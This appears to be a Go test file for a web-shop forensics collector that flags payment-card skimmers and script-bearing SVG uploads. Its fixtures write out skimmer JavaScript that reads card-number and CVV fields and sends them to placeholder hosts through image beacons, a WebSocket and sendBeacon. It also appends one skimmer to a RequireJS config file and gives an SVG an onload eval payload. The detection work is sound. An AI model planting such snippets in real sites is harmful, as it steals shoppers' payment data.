package web

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/cpibia/tripwatch/internal/collector"
)

func TestSkimmerSignals(t *testing.T) {
	for name, c := range map[string]struct {
		src  string
		want bool
	}{
		"image beacon": {`document.querySelector('[name="payment[cc_number]"]').addEventListener('blur',function(e){new Image().src='https://cdn-stats.example.com/p?d='+btoa(e.target.value)})`, true},
		"websocket":    {`var w=new WebSocket("wss://ws.example.net/c");jQuery('#cc_cid').on('change',function(){w.send(this.value)})`, true},
		"obfuscated":   {`var _0x=atob("aHR0cHM6Ly9leGFtcGxlLmNvbQ==");var c=document.getElementById("card-number").value;`, true},
		"harvest":      {`document.querySelectorAll("input").forEach(function(i){if(/cvv|card/.test(i.name))d[i.name]=i.value});navigator.sendBeacon(atob("Ly9leC5leGFtcGxl"),JSON.stringify(d))`, true},
		"bundle":       {`$(document).find("form").each(function(){var f=new FormData(this)});var i=new Image();i.src="https://cdn.example.org/x.gif";var g=new Function("return this")()`, false},
		// Built here so that no secret scanner takes the test for a leaked key.
		"secret key":   {`var k = "` + "sk_" + "live_" + strings.Repeat("Ab3", 8) + `";`, true},
		"payment form": {`define(['jquery'],function($){return {getData:function(){return {cc_number:$('#cc_number').val(),cc_cid:$('#cc_cid').val()}}, save:function(d){return $.ajax({url:'/rest/V1/carts/mine/payment-information',type:'POST',data:d})}}})`, false},
		"analytics":    {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
		"jquery-ish":   {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
	} {
		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
			t.Errorf("%s: %v (%v), want %v", name, got, skimmerSignals([]byte(c.src)), c.want)
		}
	}
}

// A skimmer appended to a bundle that existed is named once the change is seen; an SVG that runs
// script in the uploads is reported as it lands.
func TestSkimmerInChangedBundle(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/shop/bin/magento", "#!/usr/bin/env php")
	tr.file("var/www/shop/app/etc/di.xml", "<config/>")
	tr.file("var/www/shop/pub/index.php", "<?php")
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});")
	tr.file("var/www/shop/pub/static/frontend/checkout.js", "define(['jquery'],function($){return {cc_number:$('#cc_number').val()}})")
	c := &Collector{StateDir: t.TempDir()}
	scan := func() AppReport {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		for _, a := range out.(Result).Apps {
			if a.Path == "/var/www/shop" {
				return a
			}
		}
		t.Fatal("application not found")
		return AppReport{}
	}
	scan()
	if err := c.Commit(); err != nil {
		t.Fatal(err)
	}
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});\n"+
		`document.addEventListener('change',function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src='https://img.example.com/i.gif?c='+v.value}});`)
	tr.file("var/www/shop/pub/media/custom_options/quote/x.svg", `<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoMSk='))"/>`)
	tr.file("var/www/shop/pub/media/catalog/logo.svg", `<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h10v10z"/></svg>`)
	var got []string
	for _, f := range scan().Findings {
		got = append(got, f.Kind+" "+f.Path+" "+strings.Join(f.Signatures, ","))
	}
	slices.Sort(got)
	want := []string{
		"active_svg_in_upload_dir /var/www/shop/pub/media/custom_options/quote/x.svg svg_script,obfuscation",
		"payment_skimmer /var/www/shop/pub/static/frontend/requirejs-config.js payment_fields,exfiltration",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
}

// Skimmer families on a corpus of clean scripts (WEB_CORPUS): no file holds a skimmer's shape.
func TestSkimmerOnCleanCorpus(t *testing.T) {
	dir := os.Getenv("WEB_CORPUS")
	if dir == "" {
		t.Skip("WEB_CORPUS not set")
	}
	files := 0
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil || d.IsDir() || !slices.Contains(skimmerExtensions, strings.ToLower(filepath.Ext(p))) || isScript(strings.ToLower(d.Name())) {
			return err
		}
		data, err := os.ReadFile(p) //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil {
			return err
		}
		files++
		if sigs := skimmerSignals(data); sigs != nil {
			t.Errorf("%s: %v", p, sigs)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%d files", files)
}
